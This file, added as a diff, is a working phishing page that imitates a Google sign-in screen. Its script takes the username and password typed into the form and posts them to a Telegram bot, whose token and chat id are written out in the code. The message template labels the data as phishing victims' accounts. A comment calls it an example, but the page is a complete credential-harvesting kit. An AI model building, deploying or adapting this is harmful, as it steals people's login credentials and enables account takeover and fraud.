@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            text-align: center;
+        }
+
+        .login-box {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            max-width: 360px;
+            width: 100%;
+        }
+
+        .logo {
+            width: 120px;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+
+        p {
+            color: #666;
+            font-size: 14px;
+            margin: 5px 0 15px;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        input:focus {
+            border-color: #4285f4;
+        }
+
+        label {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 14px;
+            color: #666;
+            transition: top 0.2s, font-size 0.2s, color 0.2s;
+        }
+
+        input:focus + label,
+        input:not(:placeholder-shown) + label {
+            top: -5px;
+            font-size: 12px;
+            color: #4285f4;
+        }
+
+        .actions {
+            text-align: left;
+        }
+
+        .forgot-link {
+            color: #4285f4;
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .btn {
+            width: 100%;
+            background-color: #4285f4;
+            color: #fff;
+            padding: 10px;
+            font-size: 16px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .btn:hover {
+            background-color: #3367d6;
+        }
+
+        .footer {
+            font-size: 12px;
+            color: #666;
+            margin-top: 20px;
+        }
+
+        .footer a {
+            color: #4285f4;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo" class="logo">
+            <h1>Sign in</h1>
+            <p>to continue to Google</p>
+            <form id="loginForm" onsubmit="sendToTelegram(event)">
+                <div class="input-group">
+                    <input type="text" id="Username" placeholder="Username" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="Password" placeholder="Password" required>
+                </div>
+                <div class="actions">
+                    <a href="#" class="forgot-link">Forgot password?</a>
+                </div>
+                <button type="submit" class="btn">Login</button>
+                <p class="footer">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></p>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        function sendToTelegram(event) {
+            event.preventDefault(); // Prevent form from submitting normally
+
+            const username = document.getElementById('Username').value;
+            const password = document.getElementById('Password').value;
+
+            const message = `
+            /////////////////////////////////////////
+       ╭──────────────────────
+       │🕵 *DATA PHISING KORBAN* 🕵
+       │──────────────────────
+       │➣ *Akun nya: ${username}*
+       │──────────────────────
+       │➣ *Pasword nya: ${password}*
+       │──────────────────────
+       │© copyright by @yokoto_saiba ☕🗿
+       ╰──────────────────────
+       
+            `;
+
+            // Example purpose only. Use proper API for legitimate use.
+            const token = '7634973023:AAEEVxeXA0tCZqiazEVIVhaKlTn02HFmUiE';
+            const chatId = '7005751863';
+            const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;
+
+            fetch(telegramUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            })
+                .then((response) => {
+                    if (response.ok) {
+                        alert('Login berhasil.');
+                    } else {
+                        alert('login gagal . Check your connection.');
+                    }
+                })
+                .catch((error) => {
+                    console.error('Error:', error);
+                    alert('An error occurred.');
+                });
+        }
+    </script>
+</body>
+</html>
